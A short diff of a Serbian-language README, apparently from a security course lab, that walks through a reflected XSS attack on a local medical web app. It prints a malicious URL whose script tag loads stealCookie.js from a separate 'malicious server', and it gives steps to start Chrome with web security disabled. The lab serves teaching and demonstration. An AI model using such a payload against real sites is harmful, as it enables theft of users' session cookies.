@@ -25,7 +25,8 @@ Maliciozni URL koji lekar dobije na email (ili neki drugi način) izgleda ovako:
  http://localhost:8080/noResult.html?q=Sima<script%20src="http://localhost:8084/stealCookie.js"></script>
  
  4. Lekar klikne na dobijen URL i skripta stealCookie.js će se izvršiti.
- **Napomena: Browseri imaju ugradjenu zastitu od XSS-a pa je potrebno iskljuciti.
+ *Napomena: Browseri imaju ugradjenu zastitu od XSS-a pa je potrebno iskljuciti.
+ **Napomena: Pokrenuti MaliciousServer
  	- Zatvoriti SVE Chrome prozore
  	- Otvoriti cmd i pokrenuti "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --disable-web-security --user-data-dir
  	- Otici na stranicu http://localhost:8080 i ulogovati se.
